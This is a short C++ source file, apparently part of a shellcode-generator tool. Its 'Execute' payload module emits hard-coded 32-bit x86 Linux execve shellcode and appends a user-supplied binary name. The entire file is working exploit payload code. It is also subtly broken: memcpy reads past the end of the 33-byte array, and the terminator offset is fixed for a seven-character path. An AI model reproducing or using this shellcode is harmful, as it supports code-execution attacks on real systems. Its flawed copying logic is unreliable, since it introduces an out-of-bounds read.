#include "Payloads/Execute/Execute.hpp"

uint8_t* Execute::getPayload(size_t* length, argparse::ArgumentParser program)
{
    std::string binary = program.get<std::string>("--binary");

    size_t len = 33 + binary.length();
    if (length != nullptr)
        *length = len;

    uint8_t payload[] = {
        0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07, 0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
        0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0, 0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
        0xff,
    };

    uint8_t* buffer = (uint8_t*)malloc(len);
    memcpy(buffer, payload, len);

    // Append binary name on to end of shell
    for (uint32_t i = 0; i < binary.length(); i++)
        buffer[33 + i] = (uint8_t)binary[i];

    return buffer;
}